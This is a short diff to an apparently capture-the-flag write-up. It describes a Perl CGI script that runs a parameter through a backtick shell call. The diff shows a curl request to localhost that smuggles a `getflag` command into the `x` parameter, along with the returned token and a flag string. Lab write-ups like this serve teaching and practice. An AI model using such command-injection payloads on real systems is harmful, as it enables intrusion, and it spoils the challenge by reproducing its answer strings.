@@ -1,5 +1,6 @@
 ## FLAG: `qi0maab88jeaj46qoumi7maus`
 
+## We have a perl script in Home
 > ls -l
 ```
     total 4
@@ -22,6 +23,9 @@
 ## ``x(param("x"));``           1 parameter `x`
 ## ``print `echo $y 2>&1`;``    Exploit : `echo getflag 2>&1`
 
+------------------------------------------------
+
+## We exploi this using `curl`
 > curl localhost:4747?x=\`getflag\`
 ```
     Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
